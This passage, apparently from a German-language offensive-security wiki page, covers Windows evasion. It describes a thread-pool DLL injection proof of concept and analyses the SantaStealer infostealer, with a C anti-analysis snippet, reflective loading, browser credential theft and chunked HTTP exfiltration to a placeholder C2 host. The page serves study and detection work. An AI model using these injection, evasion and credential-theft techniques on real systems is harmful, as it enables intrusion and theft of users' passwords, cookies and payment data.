4. Dupliziere das Completion-Port-Handle des Ziels und rufe `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)` auf. Die Adresse des Remote-`TP_DIRECT` ist der Completion-Key. Ein bestehender Worker ruft dann `LoadLibraryA` mit dem überschriebenen Zeiger auf die Callback-Instanz auf und lädt eine DLL, auf die das Ziel bereits zugreifen kann.

Der PoC erwartet eine Ziel-PID (`DLLParty.exe <target_pid>`) und verwendet einen fest codierten DLL-Pfad in `DLLParty.cpp`; lege vor dem Erstellen einer x64-Executable einen für das Ziel zugänglichen Pfad fest. Außerdem verwendet er die `LoadLibraryA`-Adresse seines eigenen Prozesses als Remote-Callback und setzt daher voraus, dass diese Adresse im Ziel gültig ist. Der Code prüft weder, ob die Pfadlänge in das 0x58-Byte-Präfix passt, noch ob die Worker-Durchsuchung vor dem Zugriff auf das letzte Element einen Slot gefunden hat. Überprüfe die privaten Offsets, das Stack-Layout und den beschreibbaren Speicher für den jeweiligen Ziel-Build erneut. Der Verzicht auf `CreateRemoteThreadEx`, Shellcode und `VirtualAllocEx` beseitigt weder prozessübergreifende Schreibvorgänge noch Telemetrie zum Laden von DLLs.<sup>[[46]](#references)[[47]](#references)</sup>

## SantaStealer-Techniken zur dateilosen Umgehung und zum Diebstahl von Zugangsdaten

SantaStealer (auch bekannt als BluelineStealer) veranschaulicht, wie moderne Info-Stealer AV-Bypass, Anti-Analyse und den Zugriff auf Zugangsdaten in einem einzigen Workflow kombinieren.<sup>[[24]](#references)</sup>

### Tastaturlayout-Prüfung und Sandbox-Verzögerung

- Ein Konfigurationsflag (`anti_cis`) listet mit `GetKeyboardLayoutList` die installierten Tastaturlayouts auf. Wird ein kyrillisches Layout gefunden, legt das Sample einen leeren `CIS`-Marker an und beendet sich, bevor die Stealer ausgeführt werden. So wird sichergestellt, dass es in ausgeschlossenen Regionen nicht detoniert, während ein Artefakt für die Suche zurückbleibt.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Mehrschichtige `check_antivm`-Logik

- Variante A durchläuft die Prozessliste, hasht jeden Namen mit einer benutzerdefinierten rollierenden Prüfsumme und vergleicht sie mit eingebetteten Blocklisten für Debugger/Sandboxes. Anschließend berechnet sie die Prüfsumme erneut für den Computernamen und prüft Arbeitsverzeichnisse wie `C:\analysis`.
- Variante B untersucht Systemeigenschaften (Mindestanzahl von Prozessen, kürzliche Systemlaufzeit), ruft `OpenServiceA("VBoxGuest")` auf, um VirtualBox Additions zu erkennen, und führt Timing-Prüfungen rund um Wartezeiten durch, um Einzelschritte zu erkennen. Bei jedem Treffer wird abgebrochen, bevor Module gestartet werden.

### Fileless-Hilfsprogramm + doppeltes ChaCha20-Reflective-Loading

- Die primäre DLL/EXE enthält ein Chromium-Hilfsprogramm für Zugangsdaten, das entweder auf die Festplatte geschrieben oder manuell im Speicher gemappt wird. Im fileless-Modus löst es Importe/Relocations selbst auf, sodass keine Hilfsprogramm-Artefakte geschrieben werden.
- Dieses Hilfsprogramm speichert eine zweite DLL-Stufe, die zweimal mit ChaCha20 verschlüsselt ist (zwei 32-Byte-Schlüssel und zwei 12-Byte-Nonces). Nach beiden Durchläufen lädt es den Blob per Reflective Loading (ohne `LoadLibrary`) und ruft die Exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` auf, die von [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) abgeleitet sind.<sup>[[25]](#references)</sup>
- Die ChromElevator-Routinen verwenden Reflective Process Hollowing mit direkten Syscalls, um Code in einen laufenden Chromium-Browser einzuschleusen, AppBound-Encryption-Schlüssel zu übernehmen und Passwörter/Cookies/Kreditkartendaten trotz ABE-Härtung direkt aus SQLite-Datenbanken zu entschlüsseln.

### Modulare Sammlung im Speicher & HTTP-Exfiltration in Datenblöcken

- `create_memory_based_log` durchläuft eine globale Tabelle mit Funktionszeigern namens `memory_generators` und startet für jedes aktivierte Modul (Telegram, Discord, Steam, Screenshots, Dokumente, Browser-Erweiterungen usw.) einen Thread. Jeder Thread schreibt Ergebnisse in gemeinsam genutzte Puffer und meldet nach einem Join-Fenster von etwa 45 Sekunden die Anzahl seiner Dateien.
- Anschließend wird alles mit der statisch gelinkten Bibliothek `miniz` als `%TEMP%\\Log.zip` komprimiert. `ThreadPayload1` wartet dann 15 Sekunden und überträgt das Archiv in 10-MB-Blöcken per HTTP POST an `http://<C2>:6767/upload`. Dabei wird eine Browser-`multipart/form-data`-Boundary (`----WebKitFormBoundary***`) vorgetäuscht. Jeder Block enthält `User-Agent: upload`, `auth: <build_id>` und optional `w: <campaign_tag>`. Der letzte Block fügt `complete: true` hinzu, damit der C2 weiß, dass die Zusammensetzung abgeschlossen ist.

## References

- [1] [Fortgeschrittene Evasion-Techniken: präzises Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – Blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call Stacks: keine Freifahrtscheine mehr für Malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – Dokumentation](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – Beispiel](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – Beispiel](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC für Call-Stack-Spoofing](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Neue Infektionskette und ConfuserEx-basierte Verschleierung bei DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Sollte man seinem Zero Trust vertrauen? Umgehung der Zscaler-Posture-Prüfungen](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Vor ToolShell: Einblicke in frühere Ransomware-Operationen von Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Missbrauch weitergeleiteter Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Inventar weitergeleiteter Exports in Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Suchreihenfolge für Dynamic-Link Libraries](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Prozesssicherheit und Zugriffsrechte](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU-Referenz (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL-Launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – EDRs mit Unterstützung von Protected Process Light (PPL) abwehren](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Die Schutzbarriere von Windows Defender mit der Folder-Redirect-Technik durchbrechen](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Referenz zum Befehl mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Unter dem reinen Vorhang: Vom RAT über den Builder zum Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer kommt in die Stadt: Ein neuer, ambitionierter Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Entschlüsselung der Chrome App-Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Node.js-Malware mit API-Tracing besiegen](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Adaptix mit Crystal Palace in den Schlaf versetzen](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Manipulation von Prozessparametern](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET und Stack-Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko-Schlafverschleierung](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com – Dotnet Etw verbergen](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com – Missbrauch von Chrome Remote Desktop bei Red-Team-Operationen: Ein Praxisleitfaden](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research – BTR Reforged: Defenders Remediation Driver als Kernel-Operationsprimitive einsetzen](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY – BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Begleitcode zu Function Peekaboo von MDSec](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec – Function Peekaboo: selbstmaskierende Funktionen mit LLVM erstellen](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn – VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT – InjectSetConsole-Quellcode](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn – Funktion CreatePipe](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn – Erstellen eines untergeordneten Prozesses mit umgeleiteter Ein- und Ausgabe](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian – GhostPack Necromancy: C#-Tools mit WasmForge neu schmieden](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge – C#-/.NET-Projekte kompilieren](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [DLLParty-Proof-of-Concept und Quellcode](https://github.com/epersic/DLLParty)
- [47] [DLLParty — Interna des Thread-Pools für shellcodelose DLL-Injection missbrauchen](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [EMBER2024-Benchmark-Datensatz und thrember-Tools](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [EMBER2024 zur Bewertung von Red-Team-Implants verwenden](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – ML-basierte Erkennungen umgehen](https://msecops.de/blog/posts/ml-evasion/)
- [51] [Kaspersky Securelist – .NET-Ladeframework NetamLoader auf XAML-Basis](https://securelist.com/netamloader/121676)
- [52] [Microsoft Learn – AMSI_RESULT-Aufzählung](https://learn.microsoft.com/en-us/windows/win32/api/amsi/ne-amsi-amsi_result)
- [53] [Microsoft Learn – IAntimalware::Scan-Methode](https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-iantimalware-scan)
- [54] [Zscaler ThreatLabz – Technische Analyse von 2CLoader](https://zscaler.com/blogs/security-research/2cloader-new-malware-loader-delivering-vidar-and-remus)
{{#include ../banners/hacktricks-training.md}}
